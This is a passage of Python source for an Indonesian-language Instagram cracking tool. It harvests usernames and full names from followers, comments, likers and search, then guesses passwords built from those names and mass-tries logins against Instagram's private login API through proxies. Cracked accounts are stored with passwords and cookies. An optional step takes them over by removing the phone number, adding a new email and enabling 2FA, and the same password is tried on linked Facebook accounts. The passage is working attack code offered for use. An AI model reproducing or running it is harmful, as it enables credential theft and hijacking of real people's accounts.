                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Link Postingan[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Dan '[blue]Centang Biru[grey50]' Anda Juga Bisa Menggunakan Koma Untuk Dump Masal Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Search(self.username, cookie)
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[blue]Type Dump[grey50]' Dengan Ketik '[green]followers[grey50]' Untuk Dump Dari [green]Followers[grey50] Dan Ketik '[green]following[grey50]' Untuk Dump Dari [green]Following[grey50], Ketik Menggunakan Huruf Kecil Semua", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                type_dump = Console().input("[grey50]   ╰─> ")
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Dan '[blue]Centang Biru[grey50]' Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_NoLimit(uid, type_dump, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '09' or query == '9':
            try:
                Console(width=65).print(Panel('[green]01[grey50]. Chek result Ok   [green]02[grey50]. Chek result 2f   [green]03[grey50]. Chek result Cp',style=f"{style_terminal}",subtitle = "╭─────", subtitle_align = "left"))
                choose = Console().input("[grey50]   ╰─> ")
                if choose =='01' or choose =='1':
                    try: self.result_ok = os.listdir('OK')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[green]/Sdcard/OK/[grey50]'", title = f"[white]• [green] Success [white]•"))
                    for file_ok in self.result_ok: Console().print(f'[green]•[grey50]. {str(file_ok)}')
                    Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [green]OK-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                    akses_result = Console().input("[grey50]   ╰─> ")
                    self.Result(choose, akses_result)
                    exit()
                    
                elif choose =='02' or choose =='2':
                    try: self.result_two = os.listdir('2F')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[red]/Sdcard/2F/[grey50]'", title = f"[white]• [green] Success [white]•"))
                    for file_two in self.result_two: Console().print(f'[red]•[grey50]. {str(file_two)}')
                    Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [red]2F-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                    akses_result = Console().input("[grey50]   ╰─> ")
                    self.Result(choose, akses_result)
                    exit()
                    
                elif choose =='03' or choose =='3':
                    try: self.result_cp = os.listdir('CP')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[yellow]/Sdcard/CP/[grey50]'", title = f"[white]• [green] Success [white]•"))
                    for file_cp in self.result_cp: Console().print(f'[yellow]•[grey50]. {str(file_cp)}')
                    Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [yellow]CP-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                    akses_result = Console().input("[grey50]   ╰─> ")
                    self.Result(choose, akses_result)
                    exit()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '07' or query == '7':
            try: SecureIG().Secure_Akun_Instagram()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '08' or query == '8':
            try: Detedtors().Chekpoint()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '10':
            try: CreateIG()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '11':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
                              
        elif query == 'e' or query == 'E':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
        else:
            Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Opss, Menu Yang Anda Masukan Tidak Terdaftar Di Menu Ini!", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    username, fullname = akun['user']['username'], akun['user']['full_name']
                    if username+'<=>'+fullname not in dump: dump.append(username+'<=>'+fullname)
                    Console().print(f"[grey50]   ╰─> Dump [green]@{str(username)[:20]}[grey50]/[blue]{len(dump)} [grey50]Username [green]Search   ", end='\r')
                if str(response) is True:
                    self.Dump_Search(username.split(' ')[1], cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Followers(self, type, username, cookie, cursor):
        with requests.Session() as r:
            try:
                end_after = ('variables={"id":"%s","first":24,"after":"%s"}'%(username,cursor))
                params = ("query_hash=37479f2b8209594dde7facb0d904896a&{}".format(end_after))
                response = r.get(f'https://www.instagram.com/graphql/query/', params = params, headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cookie}).json()
                for akun in response['data']['user']['edge_followed_by']['edges']:
                    if akun not in dump:
                        dump.append(akun['node']['username']+'<=>'+akun['node']['full_name'])
                        Console().print(f"[grey50]   ╰─> Dump [green]@{str(akun['node']['username'])[:20]}[grey50]/[blue]{len(dump)} [grey50]Username [green]Followers   ", end='\r')
                end_cursor = response['data']['user']['edge_followed_by']['page_info']['has_next_page']
                if end_cursor is True:
                    cursor = response['data']['user']['edge_followed_by']['page_info']['end_cursor']
                    self.Dump_Followers(type, username, cookie, cursor)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass  
            
    def Dump_NoLimit(self,username, type_dump, cookie, cursor):
        with requests.Session() as r:
            try:
                response = r.get('https://i.instagram.com/api/v1/friendships/{}/{}/?count=100&max_id={}'.format(username,type_dump,cursor), headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)","cookie": cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f"[grey50]   ╰─> Dump [green]@{str(akun['username'])[:20]}[grey50]/[blue]{len(dump)} [grey50]Username '[green]{type_dump}[grey50]'  ", end='\r')
                if "next_max_id" in str(response):
                    self.Dump_NoLimit(username, type_dump, cookie, response["next_max_id"])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass  

    def Dump_Following(self,type, username, cookie, cursor):
        with requests.Session() as r:
            try:
                end_after = ('variables={"id":"%s","first":24,"after":"%s"}'%(username,cursor))
                params = ("query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(end_after))
                response = r.get(f'https://www.instagram.com/graphql/query/', params = params, headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cookie}).json()
                for akun in response['data']['user']['edge_follow']['edges']:
                    if akun not in dump:
                        dump.append(akun['node']['username']+'<=>'+akun['node']['full_name'])
                        Console().print(f"[grey50]   ╰─> Dump [green]@{str(akun['node']['username'])[:20]}[grey50]/[blue]{len(dump)} [grey50]Username [green]Followings   ", end='\r')
                end_cursor = response['data']['user']['edge_follow']['page_info']['has_next_page']
                if end_cursor is True:
                    cursor = response['data']['user']['edge_follow']['page_info']['end_cursor']
                    self.Dump_Followers(type, username, cookie, cursor)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass  
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f"[bold grey50]   ╰─>[bold white] dump [bold green]@{str(akun['user']['username'])[:20]}[bold grey50]/[bold blue]{len(dump)} [bold white]username [bold green]komentar     ", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f"[bold grey50]   ╰─>[bold white] dump [bold green]@{str(akun['username'])[:20]}[bold grey50]/[bold blue]{len(dump)} [bold white]username [bold green]search nama     ", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'OK/'+str(isi)).readlines():
                try: tree = Tree('\r'); tree = tree.add('[b italic green]Response success'); tree.add(f'[italic grey50]username : [green]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [green]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [green]{buka.split("|")[2]}'); true = tree.add('[italic green]Response date'); true.add(f'[italic grey50]data profile : [bold green]{buka.split("|")[3]}[grey50]/[green]{buka.split("|")[4]}[grey50]/[green]{buka.split("|")[5]}'); truu= tree.add('[italic green]Response 2FA'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[6]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[7]}'); truu.add(f'[iitalic grey50]Response : [green]{buka.split("|")[8]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[9]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[10]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[11]}'); trua = tree.add('[italic green]Response cookie'); trua.add(f'[italic grey50]cookie : [green]{buka.split("|")[12]}'); tree.add("[italic green]Success cek in Result OK"); printz(tree)
                except Exception: tree = Tree('\r'); tree = tree.add('[italic green]Response success'); tree.add(f'[italic grey50]username : [green]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [green]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [green]{buka.split("|")[2]}'); true = tree.add('[italic green]Response date'); true.add(f'[italic grey50]data profile : [green]{buka.split("|")[3]}[grey50]/[green]{buka.split("|")[4]}[grey50]/[green]{buka.split("|")[5]}'); trua = tree.add('[italic green]Response cookie'); trua.add(f'[italic grey50]cookie : [green]{buka.split("|")[6]}'); tree.add("[italic green]Success cek in Result OK"); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'2F/'+str(isi)).readlines():
                try: tree = Tree('\r'); tree = tree.add('[italic red]Response 2F'); tree.add(f'[italic grey50]username : [red]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [red]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [red]{buka.split("|")[3]}'); true = tree.add('[italic red]Response date'); true.add(f'[italic grey50]data profile : [red]{buka.split("|")[4]}[grey50]/[red]{buka.split("|")[5]}[grey50]/[red]{buka.split("|")[5]}'); tree.add("[italic red]Success cek in Result 2F"); printz(tree)   
                except Exception: tree = Tree('\r'); tree = tree.add('[italic red]Response 2F'); tree.add(f'[italic grey50]username : [red]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [red]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [red]{buka.split("|")[3]}'); tree.add("[italic red]Success cek in Result 2F"); printz(tree)   
                
        elif result in ('3','03'):
            for buka in open(f'CP/'+str(isi)).readlines():
                try: tree = Tree('\r'); tree = tree.add('[italic yellow]Response Checkpoint'); tree.add(f'[italic grey50]username : [yellow]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [yellow]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [yellow]{buka.split("|")[3]}'); true = tree.add('[italic yellow]Response date'); true.add(f'[italic grey50]data profile : [yellow]{buka.split("|")[4]}[grey50]/[yellow]{buka.split("|")[5]}[grey50]/[yellow]{buka.split("|")[5]}'); tree.add("[italic yellow]Success cek in Result CP"); printz(tree)   
                except Exception: tree = Tree('\r'); tree = tree.add('[italic yellow]Response Checkpoint'); tree.add(f'[italic grey50]username : [yellow]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [yellow]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [yellow]{buka.split("|")[3]}'); tree.add("[italic yellow]Success cek in Result CP"); printz(tree)   
            
    def Methode(self):
        try:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Rekomendasi Method Crack Dari Admin Yaitu : [green]Private Api App 2024[grey50] Dan [green]Private Api Threads[grey50], Untuk Method Lain Bisa Di Coba Sendiri Dan Untuk Rekomendasi Provider Yang Bagus Buat Crack Yaitu : [blue]Indosat [grey50]Dan [blue]Telkomsel[grey50], Untuk Provider Lain Bisa Di Coba Sendiri", title = f"[white]• [green]Catatan [white]•", subtitle=f'[italic grey50]• Dump : [green]{str(len(dump))} [white]•', subtitle_align = "left"))
            Console().print(Columns([Panel('[green]01[grey50]. Private Api Qsyinc\n[green]02[grey50]. Private Api App 2024', width=32, style = f"{style_terminal}", subtitle = "╭─────", subtitle_align = "left"), Panel('[green]03[grey50]. Private Api Threads\n[green]04[grey50]. Private Api Smartlock', width=32, style = f"{style_terminal}")]))
            Method = Console().input("[grey50]   ╰─> ")
            self.Exec_Password(Method)
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()                     
        
    def Password(self, name, kombinasi):
        self.password = []
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            else:
                if kombinasi in ('01') or kombinasi in ('1'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123']
                elif kombinasi in ('02') or kombinasi in ('2'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234']
                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                else: komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                for passwords in komb:
                    if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                        continue
                    else:
                        self.password.append(f'{str(passwords).lower()}')
        for passwords in [f'{name}', f'{name.replace(" ", "")}']:
            if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                continue
            else:
                self.password.append(f'{str(passwords).lower()}')
        return (self.password)
        
    def Exec_Password(self, Method):
        try:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Rekomendasi Password Crack Dari Admin Yaitu : [green]Fullname, Nama 1-5[grey50] Dan [green]Fullname, Nama 1-5 + M[grey50], Untuk Password Lain Bisa Di Coba Sendiri", title = f"[white]• [green]Catatan [white]•"))
            Console().print(Columns([Panel('[green]01[grey50]. Fullname, Nama 1-3\n[green]02[grey50]. Fullname, Nama 1-4', width=32, style = f"{style_terminal}", subtitle = "╭─────", subtitle_align = "left"), Panel('[green]03[grey50]. Fullname, Nama 1-5\n[green]04[grey50]. Fullname, Nama 1-6 + M', width=32, style = f"{style_terminal}")]))   
            Password_Akun = Console().input("[grey50]   ╰─> ")
            self.Exec_Methode(Method, Password_Akun)
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()    
        
    def Exec_Methode(self, Method_Type, Password_Akun):
        self.tambahan = []
        if Password_Akun in ('04') or Password_Akun in ('4'):
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Password Tambahan, Misalnya : [green]kamu nanya,wonogiri[grey50] Tanpa Spasi Dan Banyaknya Password Gunakan Pemisah Koma", title = f"[white]• [green]Catatan [white]•"))
            tambahan = Console().input("[grey50]   ╰─> ")
            for tamb in tambahan.split(','):
                self.tambahan.append(f'{tamb}')   
        Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Apakah Anda Ingin Menggunakan Otomatis Ubah Data ([green]Hapus Nomor, Ganti Email, Pasang 2FA[grey50]) Pada Akun OK?, Jika Ingin Menggunakannya Ketik [green]Y[grey50] Dan Jika Tidak Menggunakannya Ketik Sebaliknya [red]T', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
        Secure_Akun = Console().input("[grey50]   ╰─> ")
        if Secure_Akun =='y' or Secure_Akun =='Y': self.amankan_akun.append('ya')   
        self.save_result = self.Simpan_Result()
        Console(width = 65, style = f"{style_terminal}").print(Panel(f'\
[grey50]Result OK tersimpan di : OK/OK-Instagram-{self.save_result}\nResult 2F tersimpan di : 2F/2F-Instagram-{self.save_result}\nResult Cp tersimpan di : CP/CP-Instagram-{self.save_result}\n\
    - Mainkan Mode Pesawat 5 Detik Setiap 200 Loop -', title = f"[white]• [green]Save Result [white]•"))
        with ThreadPoolExecutor(max_workers=30) as V:
            for Username_And_Fullname in dump:
                username, fullname = Username_And_Fullname.split('<=>')
                if Password_Akun in ('04') or Password_Akun in ('4'):
                    password = self.Password(fullname, Password_Akun) + self.tambahan
                else: password = self.Password(fullname, Password_Akun) + self.tambahan
                if Method_Type in ('1') or Method_Type in ('01'): V.submit(self.Exec_Private_Api, username, password)
                elif Method_Type in ('2') or Method_Type in ('02'): V.submit(self.Exec_Private_Api_V2, username, password)
                elif Method_Type in ('3') or Method_Type in ('03'): V.submit(self.Exec_Private_Api_Threads, username, password)
                elif Method_Type in ('4') or Method_Type in ('04'): V.submit(self.Exec_Private_Api_Smartlock, username, password)
                else: V.submit(self.Exec_Private_Api_Threads, username,password)
        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Kamu Telah Mendapatkan [green]{self.success}[grey50] Hasil [green]Success[grey50], [red]{self.faktor}[grey50] Hasil [red]Two Faktor[grey50] Dan [yellow]{self.chekpoint}[grey50] Hasil [yellow]Checkpoint[grey50] Dari [blue]{len(dump)}[grey50] Username, Semua Hasil Tersimpan Di Result!", title = "[white]• [green]Selesai [white]•"))
        exit()
        
    def Exec_Private_Api(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8')) 
                Instagram_App = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
                kode_App = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(Instagram_App).encode('utf=8'),hashlib.sha256).hexdigest()
                data = {"signed_body": f"{kode_App}.{str(Instagram_App)}"}
                headers = {'Host': 'b.i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'ar-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Instagram 119.8.0.12.137 Android (27/9; 420dpi; 1080x2201; poco; 220333QPG; 211033MI; qcom; in_ID)', 'accept-encoding': 'gzip, deflate'}
                resp = byps.get('https://b.i.instagram.com/api/v1/qe/sync/', data=data, headers=headers, allow_redirects=True)
                byps.headers.update({**Requ().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(2500000,3000000) / 1000),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': f'android-{hash.hexdigest()[:16]}',
                    'x-ig-timezone-offset': str(Requ().timezone_offset()),
                    'x-ig-app-id': '567067343352427',
                    'user-agent': Useragent().useragent_instagram2(Requ().HeadersApiLogin()['x-bloks-version-id']).replace('Barcelona','Instagram')
                })
                payload = json.dumps({
                    'username':username,
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': resp.cookies.get('csrftoken',None),
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-%s'%(Requ().Android_ID(username,passwd).hexdigest()[:16]),
                    'login_attempt_count': '0',
                    'enc_password': '#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(passwd)
                })
                encode = ('signed_body='+Requ().Blok_ID()+'.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                byps.headers.update({
                    'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                })
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response = byps.post('https://b.i.instagram.com/api/v1/accounts/login/', data = encode, proxies = proxy, allow_redirects=True).text
                self.save_result = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try:
                        cookie = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                    except (Exception) as e: cookie = ('Cookies tidak di temukan')
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try: facebook_acc = Requ().Facebook_Acc(cookie)
                    except (UnboundLocalError) as e: pass
                    try:
                        users = facebook_acc.split('|')[0]
                        fulls = facebook_acc.split('|')[1]
                        response_facebook = AccesFacebook().Username_And_Password(users,passwd)
                    except (Exception, UnboundLocalError) as e: response_facebook = ('Response Error 404')
                    if 'ya' in self.amankan_akun:
                        try:
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} berhasil di hapus' if statp is True else f'{pone} gagal di hapus '
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'A2F berhasil di aktifkan' if statf is not False else 'A2F gagal di aktifkan'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'berhasil di konfirmasi' if state is True else 'gagal di konfirmasi'
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            truu= tree.add('[italic green]Response 2FA')
                            truu.add(f'[italic white]Response [green]{email} {statd}')
                            truu.add(f'[italic white]Response [green]{inbx}')
                            truu.add(f'[italic white]Response [green]{deleted}')
                            truu.add(f'[italic white]Response [green]{stat2fa}')
                            truu.add(f'[italic white]Response [green]{key}')
                            truu.add(f'[italic white]Response [green]{kode}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
